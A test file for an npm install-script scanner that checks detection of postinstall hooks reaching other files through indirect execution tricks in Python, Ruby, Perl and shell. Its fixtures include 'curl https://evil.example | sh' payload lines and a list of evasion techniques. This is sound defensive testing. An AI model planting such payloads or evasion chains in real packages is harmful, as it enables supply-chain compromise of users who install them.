import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";
const rb = "system('curl evil|sh')\n";
const pl = "system('curl evil|sh');\n";
const js = "require('child_process').execSync('curl evil|sh')\n";
const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const plE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "perl install.pl" }),
  "install.pl": body,
  [f]: "true\n",
  "README.md": "a\n",
});

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

// A non-JS file is static only when every statement is allowlisted.
// exec() of a literal is still that file, so L13 leaves README quiet.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["L1 py import os as o", pyE("import os as o\no.system('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L2 py from os import system", pyE("from os import system\nsystem('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L3 py from os import system as s", pyE("from os import system as s\ns('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L4 py bound method var", pyE("import subprocess\nr = subprocess.run\nr(['sh', 'docs/run.sh'])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L5 py Popen as P", pyE("from subprocess import Popen as P\nP(['sh', 'docs/run.sh']).wait()\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L6 py __dict__ lookup", pyE("import subprocess\nsubprocess.__dict__['run'](['sh', 'docs/run.sh'])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L7 py vars(os)", pyE("import os\nvars(os)['system']('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L8 py os.environ BASH_ENV", pyE("import os,subprocess\nos.environ['BASH_ENV'] = 'docs/run.sh'\nsubprocess.run(['bash', '-c', 'true'])\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L9 py sys.path +=", pyE("import sys\nsys.path += ['docs']\nimport run\n", "docs/run.py"), "docs/run.py", py, false],
  ["L10 py site.addsitedir", pyE("import site\nsite.addsitedir('docs')\nimport run\n", "docs/run.py"), "docs/run.py", py, false],
  ["L11 py SourceFileLoader", pyE("from importlib.machinery import SourceFileLoader\nSourceFileLoader('r', 'docs/run.py').load_module()\n", "docs/run.py"), "docs/run.py", py, false],
  ["L12 py shutil copy then import", pyE("import shutil\nshutil.copy('docs/run.py', 'tmp_run.py')\nimport tmp_run\n", "docs/run.py"), "docs/run.py", py, false],
  ["L13 py exec open read", pyE("exec(open('docs/run.py').read())\n", "docs/run.py"), "docs/run.py", py, true],
  ["L14 rb Kernel.send", rbE("Kernel.send(:system, 'sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L15 rb method(:system).call", rbE("method(:system).call('sh docs/run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L16 rb LOAD_PATH unshift", rbE("$LOAD_PATH.unshift 'docs'\nrequire 'run'\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["L17 rb $: <<", rbE("$: << 'docs'\nrequire 'run'\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["L18 rb instance_eval File.read", rbE("instance_eval(File.read('docs/run.rb'))\n", "docs/run.rb"), "docs/run.rb", rb, false],
  ["L19 rb open pipe", rbE("open('|sh docs/run.sh').read\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L20 rb Process.spawn", rbE("Process.wait(Process.spawn('sh docs/run.sh'))\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L21 pl readpipe", plE("readpipe('sh docs/run.sh');\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L22 pl 2-arg pipe open", plE("open(F, 'sh docs/run.sh|'); print <F>;\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L23 pl use lib + require", plE("use lib 'docs';\nrequire Run;\n", "docs/Run.pm"), "docs/Run.pm", pl, false],
  ["L24 pl push INC + do", plE("BEGIN { push @INC, 'docs' }\ndo 'run.pl';\n", "docs/run.pl"), "docs/run.pl", pl, false],
  ["L25 pl CORE::system ref", plE("my $c = \\&CORE::system;\n$c->('sh docs/run.sh');\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L26 sh export BASH_ENV line", shE("export BASH_ENV=docs/run.sh\nbash -c true\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L27 sh assign; export; run", shE("BASH_ENV=docs/run.sh; export BASH_ENV; bash -c true\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L28 sh export PYTHONPATH", shE("export PYTHONPATH=docs\npython3 -c 'import run'\n", "docs/run.py"), "docs/run.py", py, false],
  ["L29 sh export NODE_OPTIONS", shE("export NODE_OPTIONS='--require ./docs/run.js'\nnode -e 0\n", "docs/run.js"), "docs/run.js", js, false],
  ["L30 sh python3 -m spaced", shE("python3 -m docs.run\n", "docs/run.py"), "docs/run.py", py, false],
  ["L31 sh eval cat", shE("eval \"$(cat docs/run.sh)\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L32 sh process substitution", shE("bash <(cat docs/run.sh)\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L33 sh cp then run", shE("cp docs/run.sh x.sh && sh x.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L34 sh ln then run", shE("ln -s docs/run.sh x.sh\nsh x.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L35 sh cat redirect then run", shE("cat docs/run.sh > x.sh\nsh x.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L36 sh function wrapper", shE("f() { sh docs/run.sh; }\nf\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["L37 sh PERL5OPT on line", shE("PERL5OPT=-Mrun PERL5LIB=docs perl -e1\n", "docs/run.pm"), "docs/run.pm", pl, false],
  ["L38 sh here-string source", shE("bash -s <<< \"$(cat docs/run.sh)\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}
